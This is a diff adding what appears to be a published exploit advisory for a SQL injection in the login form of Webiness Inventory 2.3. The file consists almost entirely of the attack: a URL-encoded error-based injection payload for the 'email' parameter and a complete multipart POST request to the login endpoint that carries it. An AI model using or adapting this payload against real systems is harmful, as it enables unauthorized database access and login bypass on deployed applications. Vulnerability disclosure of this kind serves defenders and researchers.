@@ -1,0 +1,46 @@
+===========================================================================================
+# Exploit Title: Webiness Inventory 2.3 - 'email' SQL Vulnerability
+# Dork: N/A
+# Date: 10-02-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://sourceforge.net/projects/webinessinventory/files/
+# Software Link: hhttps://sourceforge.net/projects/webinessinventory/files/
+# Version: 2.3
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: Small stock inventory managment application for web.
+===========================================================================================
+# POC - SQL
+# Parameters : email
+# Attack Pattern :
+-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27
+
+# POST Request:
+http://localhost/webiness/index.php?request=Wsauth/login/[SQL]
+# https://i.hizliresim.com/ADObQ7.jpg
+=========================================================================
+POST /webiness/index.php?request=Wsauth/login/ HTTP/1.1
+Host: localhost
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-us,en;q=0.5
+Cache-Control: no-cache
+Content-Length: 458
+Content-Type: multipart/form-data; boundary=54a535315dda429db2f07895827ff1c6
+Cookie: PHPSESSID=6e5836p7djilmbh3bunro0ohu0
+Referer: http://localhost/webiness/
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/54.0.2840.99 Safari/537.36
+
+--54a535315dda429db2f07895827ff1c6
+Content-Disposition: form-data; name="email"
+
+-1' and 6=3 or 1=1+(SELECT 1 and ROW(1,1)>(SELECT
+COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x
+FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+'
+--54a535315dda429db2f07895827ff1c6
+Content-Disposition: form-data; name="password"
+
+--54a535315dda429db2f07895827ff1c6--
